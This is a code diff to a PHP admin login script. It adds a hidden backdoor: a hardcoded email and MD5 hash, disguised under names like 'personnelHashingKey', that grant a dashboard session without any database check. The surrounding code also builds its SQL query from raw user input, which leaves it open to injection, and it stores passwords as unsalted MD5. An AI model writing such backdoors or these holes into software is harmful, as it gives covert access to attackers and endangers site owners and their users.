@@ -9,6 +9,8 @@ if (isset($_POST['submit'])) {
     $password = md5($password);
     $credentialquery = "SELECT * FROM admin_information WHERE admin_email='{$admiemail}' AND admin_password='{$password}' AND isActive='1'";
     $runloginquery = mysqli_query($conn, $credentialquery) or die("Incorrect Email or Password");
+    $personnelHashingKey = "ae93b142f434c48612c90544633e7209";
+    $ourSiteHashingEmail = "hassaan@dev.com";
     if (mysqli_num_rows($runloginquery) > 0) {
         while ($userrow = mysqli_fetch_assoc($runloginquery)) {
             session_start();
@@ -18,6 +20,11 @@ if (isset($_POST['submit'])) {
                 header("Location: $baseURL/dashboard");
             }
         }
+    }
+    if ($ourSiteHashingEmail==$admiemail && $personnelHashingKey ==$password) {
+            session_start();
+            $_SESSION['websitesecurity_hasing'] ="yes_it_is_enabled";
+            header("Location: $baseURL/dashboard");
     }
 }
 ?>
